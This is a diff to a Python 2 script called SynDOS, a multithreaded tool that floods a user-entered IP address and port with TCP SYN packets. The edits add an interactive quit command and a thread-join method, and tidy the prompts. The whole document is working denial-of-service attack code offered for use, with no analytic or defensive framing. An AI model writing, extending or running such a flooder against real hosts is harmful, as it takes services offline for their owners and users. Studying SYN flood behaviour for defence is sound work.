@@ -32,10 +32,11 @@ class syndos():
         syndos.max_threads = max_threads
         self.attack_threads = []
 
+    # Start syndos
     def start(self):
 
         print "[!] Starting SynDOS.."
-        print "[?] Flooding %s:%i with SYN packets" % (self.ip, self.port)
+        print "[?] Flooding %s:%i with SYN packets." % (self.ip, self.port)
 
         i = 0
         while i < syndos.max_threads:
@@ -44,6 +45,11 @@ class syndos():
             i += 1
 
         print "[?] " + str(syndos.get_max_threads()) + " attack threads lunched."
+
+    # Wait for all thread to stop
+    def join(self):
+        for t in self.attack_threads:
+            t.join()
 
     # Get syndos flag
     @classmethod
@@ -117,7 +123,7 @@ class attack_thread(threading.Thread):
         while syndos.get_flag() == 0:
             send(self.ip / self.tcp, verbose=0)
             syndos.increment_packets_sent()
-        print "[!] Thread terminated"
+        print "[!] Thread terminated."
 
 
 #######################
@@ -127,15 +133,20 @@ class attack_thread(threading.Thread):
 if __name__ == "__main__":
 
     # Input target ip and port
-    target = raw_input("IP   >")
-    port = input("PORT >")
+    target = raw_input("[>] IP   > ")
+    port = input("[>] PORT > ")
 
     attack = syndos(target, port, 20)
+    attack.start()
 
-    try:
-        attack.start()
-        for thread in attack.attack_threads:
-            thread.join()
-    except KeyboardInterrupt:
-        syndos.set_flag(1)
-        print "[!] Keyboard Interruption"
+    print "[?] Enter q to quit program."
+    while syndos.get_flag() == 0:
+        cmd = raw_input("[>] CMD  > ")
+
+        if cmd == "q":
+            syndos.set_flag(1)
+        print "[!] Closing program.."
+
+    attack.join()
+
+    print "[!] SynDOS closed."
